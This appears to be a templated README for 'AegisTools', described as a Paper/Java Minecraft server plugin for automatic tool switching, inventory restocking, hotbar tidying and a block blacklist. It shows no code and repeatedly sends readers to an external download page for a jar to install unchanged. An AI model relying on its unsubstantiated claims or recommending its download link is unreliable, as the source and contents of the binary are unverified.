# AegisTools - Game Script Utility 2026

> **AegisTools is a Paper/Java Minecraft server plugin that picks the right tool for the job, restocks items from inventory, and keeps your hotbar tidy while you break blocks on repeat.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Paper%2FJava-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zackbrooks68/aegistools-mc-paper-script?style=flat-square)](https://github.com/zackbrooks68/aegistools-mc-paper-script)

---

<p align="center">
  <a href="https://zackbrooks68.github.io/aegistools-mc-paper-script/">
    <img src="https://img.shields.io/badge/Download-AegisTools%20Script-brightgreen?style=for-the-badge" alt="Download AegisTools Script">
  </a>
</p>

> **[Direct Download - AegisTools](https://zackbrooks68.github.io/aegistools-mc-paper-script/)**

---

[Download Latest Build](https://zackbrooks68.github.io/aegistools-mc-paper-script/)

---

## What It Does

Built for Paper servers on Java, AegisTools cuts down on manual inventory juggling during long mining or clearing sessions. When you aim at a block, it can switch to a fitting tool, pull more of the items you need from elsewhere in your inventory, and keep tools laid out sensibly on the hotbar.

Operators and players also get an in-game GUI to maintain a block blacklist, so certain blocks can be left out of automatic tool handling without leaving Minecraft to edit configs. Ongoing work stays centered on those block-breaking and inventory helpers.

---

## What You Get

- Automatic choice of an appropriate tool for the block under the crosshair.
- Restocking of supported items and blocks from the rest of the inventory.
- Hotbar layout help so tools stay easy to reach during long sessions.
- In-game GUI for building and editing a block blacklist.
- Drop-in install as a Paper server plugin (not a client mod).
- Aimed at Java Minecraft server stacks.
- Lean runtime footprint around the main helper logic.
- Practical fit for repetitive mining and bulk block-breaking.

---

## Installation

1. Grab the current AegisTools build from the [download page](https://zackbrooks68.github.io/aegistools-mc-paper-script/).
2. Make sure the host is a Paper server running on Java.
3. Copy the plugin jar into the server `plugins` folder.
4. Boot the server, or restart it if it is already running.
5. Connect in-game and use the plugin controls to tune tool behavior and blacklist entries.

Build artifacts may use slightly different filenames. Leave the file name as downloaded when you put it in `plugins`.

---

## Configuration Focus

Behavior clusters around four areas: picking tools, refilling inventory, arranging the hotbar, and skipping blacklisted blocks.

| Option | Purpose |
|---|---|
| Tool selection | Chooses a suitable tool for the targeted block. |
| Inventory refill | Replenishes supported items and blocks from the player's inventory. |
| Hotbar management | Organizes tools in the hotbar for repeated use. |
| Block blacklist | Uses the in-game GUI to exclude selected blocks. |

Blacklist changes go through the in-game UI. Everything else follows whatever the installed build exposes; that can change from one release to another.

---

## Compatibility

- **Game:** Minecraft
- **Platform:** Paper
- **Runtime:** Java
- **Installation type:** Server-side Paper plugin

Extracted project metadata does not pin exact Minecraft or Paper version numbers. Read the notes for the build you plan to run before you deploy it. Results can differ on unsupported stacks or when other plugins also touch inventory, hotbar, or break events.

---

## Changelog

### 2026

- Documentation drafted for the AegisTools Paper/Java Minecraft plugin.
- Feature set documented around tool switching, inventory refill, hotbar organization, and block blacklisting.

---

## FAQ

### How do I install AegisTools?

Get a build, drop the plugin file into the Paper server `plugins` folder, then start or restart the server.

### Does AegisTools run on a client?

No. It is documented as a server-side plugin for Paper Minecraft servers.

### How are blocks excluded from the tool workflow?

Open the in-game blacklist GUI and mark the blocks you want skipped.

### Can I customize the hotbar behavior?

Hotbar organization is part of the core feature set. How much you can tweak depends on the build you installed and the settings it ships with.

### How do updates work?

Download a newer build from the project download page and swap it in using your usual plugin update steps. Skim the release notes first.

### Which Minecraft versions are supported?

Metadata points at Minecraft on Paper with Java, without listing precise version strings. Confirm support on the release page for the build you choose.

### Where should the plugin file be stored?

Only in the Paper server `plugins` directory—not inside a vanilla or modded client folder.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
